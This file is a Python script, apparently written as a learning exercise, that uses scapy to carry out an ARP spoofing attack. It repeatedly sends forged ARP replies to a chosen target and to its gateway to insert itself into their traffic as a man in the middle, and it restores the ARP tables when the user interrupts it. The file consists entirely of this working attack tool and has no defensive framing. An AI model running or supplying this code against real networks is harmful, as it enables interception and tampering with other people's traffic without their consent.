#!/usr/bin/env python
import sys

import scapy.all as scapy
import time
import argparse

def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-t", "--target_ip", dest="target" , help="Target IP Address", required=True)
    parser.add_argument("-g", "--gateway_ip", dest="gateway" , help="Gateway IP Address", required=True)
    options = parser.parse_args()
    if not options.target:
        print("[-] Please specify target IP Address, use --help for more info.")
        sys.exit()
    elif not options.target:
        print("[-] Please specify gateway IP Address, use --help for more info.")
        sys.exit()
    return options

def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    boardcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_boardcast = boardcast / arp_request
    answered_list = scapy.srp(arp_request_boardcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc

def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op =2, pdst = destination_ip, hwdst = destination_mac, psrc = source_ip, hwsrc = source_mac)
    scapy.send(packet, count=1, verbose=False)
send_packets_count = 0

options = get_arguments()
target_ip = options.target
gateway_ip = options.gateway

try:
    while True:
        spoof(target_ip, gateway_ip)
        spoof(gateway_ip, target_ip)
        send_packets_count += 2
        print("\r[+] Packets Send: " + str(send_packets_count), end="", flush=True)
        time.sleep(2)

except KeyboardInterrupt:
    print("\n[+] Ctrl+C received, Resetting ARP table......Please Wait\n")
    restore(target_ip, gateway_ip)
    restore(gateway_ip, target_ip)
    print("\n[+] ARP Table Restored!")